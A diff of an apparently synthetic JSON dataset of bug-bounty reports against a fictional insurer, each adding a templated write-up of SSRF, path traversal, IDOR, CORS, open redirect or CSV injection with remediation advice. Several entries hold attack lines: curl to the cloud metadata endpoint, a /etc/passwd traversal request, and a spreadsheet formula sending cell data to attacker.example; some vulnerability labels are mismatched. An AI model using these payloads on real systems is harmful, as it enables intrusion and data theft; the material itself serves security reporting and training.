+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11214,7 +11298,8 @@
           "offset": "6d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11350,7 +11435,8 @@
           "offset": "6d 15h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11477,7 +11563,8 @@
           "offset": "1d 5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11612,7 +11699,8 @@
           "offset": "5d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11766,7 +11854,8 @@
           "offset": "8d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11913,7 +12002,8 @@
           "offset": "2d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12044,7 +12134,8 @@
           "offset": "7d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12196,7 +12287,8 @@
           "offset": "8d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12324,7 +12416,8 @@
           "offset": "1d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12484,7 +12577,8 @@
           "offset": "5d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12583,7 +12677,8 @@
           "offset": "9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12731,7 +12826,8 @@
           "offset": "4d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12875,7 +12971,8 @@
           "offset": "2d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12971,7 +13068,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.silberkamm-insurance.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13111,7 +13209,8 @@
           "offset": "1d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13193,7 +13292,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13343,7 +13443,8 @@
           "offset": "5d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13519,7 +13620,8 @@
           "offset": "6d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13659,7 +13761,8 @@
           "offset": "3d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.silberkamm-insurance.foo/export`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13749,7 +13852,8 @@
           "offset": "4d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13848,7 +13952,8 @@
           "offset": "4d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.silberkamm-insurance.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13960,7 +14065,8 @@
           "offset": "4d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14092,7 +14198,8 @@
           "offset": "2d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14208,7 +14315,8 @@
           "offset": "4d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14364,7 +14472,8 @@
           "offset": "2d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14508,7 +14617,8 @@
           "offset": "4d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14648,7 +14758,8 @@
           "offset": "7d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14767,7 +14878,8 @@
           "offset": "8d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.silberkamm-insurance.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14895,7 +15007,8 @@
           "offset": "3d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15017,7 +15130,8 @@
           "offset": "7d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15161,7 +15275,8 @@
           "offset": "1d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
